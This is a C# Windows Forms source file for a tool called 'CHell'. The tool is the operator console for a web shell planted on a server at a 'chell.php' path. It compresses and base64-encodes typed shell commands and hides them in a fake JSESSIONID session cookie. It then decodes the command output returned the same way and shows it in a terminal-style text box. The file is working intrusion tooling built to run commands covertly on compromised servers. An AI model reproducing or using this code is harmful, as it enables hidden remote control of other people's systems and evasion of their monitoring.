using System;
using System.Text;
using System.IO;
using System.IO.Compression;
using System.Windows.Forms;
using System.Net;

namespace CHell
{
    public partial class Form : System.Windows.Forms.Form
    {
        public Form()
        {
            InitializeComponent();
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            byte[] gziped;
            string b64;
            string rb64;
            Uri dest;
            if (Target.Text != "") {
                if (Target.Text != "http://<TARGET>/chell.php")
                {
                    if (Command.Text != "")
                    {
                        using (var ms = new MemoryStream())
                        {
                            using (var ts = new GZipStream(ms, CompressionMode.Compress))
                            using (var ims = new MemoryStream(Encoding.UTF8.GetBytes(Command.Text)))
                                ims.CopyTo(ts);
                            gziped = ms.ToArray();
                        }
                        b64 = Convert.ToBase64String(gziped, 0, gziped.Length);
                        dest = new Uri(Target.Text);
                        HttpWebRequest req = (HttpWebRequest)WebRequest.Create(dest);
                        req.CookieContainer = new CookieContainer();
                        req.CookieContainer.Add(new Cookie("JSESSIONID", b64) {Domain =  dest.Host});
                        using var resp = (HttpWebResponse)req.GetResponse();
                        foreach (Cookie bisc in resp.Cookies)
                        {
                            if (bisc.Name == "JSESSIONID")
                            {
                                if (bisc.Value != b64)
                                {
                                    rb64 = bisc.Value.Replace("%3D", "=").Replace("%2F", "/").Replace("%2B", "+");
                                    using MemoryStream ins = new MemoryStream(Convert.FromBase64String(rb64));
                                    using var bs = new GZipStream(ins, CompressionMode.Decompress);
                                    using var bso = new MemoryStream();
                                    bs.CopyTo(bso);
                                    if (checkBox1.Checked)
                                    {
                                        Output.Text = string.Join(System.Environment.NewLine, "CHell$ " + Command.Text, Encoding.UTF8.GetString(bso.ToArray()).Replace("\n", "\r\n"), Output.Text);
                                    }
                                    else
                                    {
                                        Output.Text = string.Join(System.Environment.NewLine, "CHell$ " + Command.Text, Encoding.UTF8.GetString(bso.ToArray()).Replace("\n", "\r\n"));
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        private void Copyout_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(Output.Text);
        }

        private void Target_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                Button1.PerformClick();
            }
        }

        private void Command_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                Button1.PerformClick();
            }
            if (e.KeyCode == Keys.Escape)
            {
                Application.Exit();
            }
        }

        private void Command_TextChanged(object sender, EventArgs e)
        {

        }


    }
}
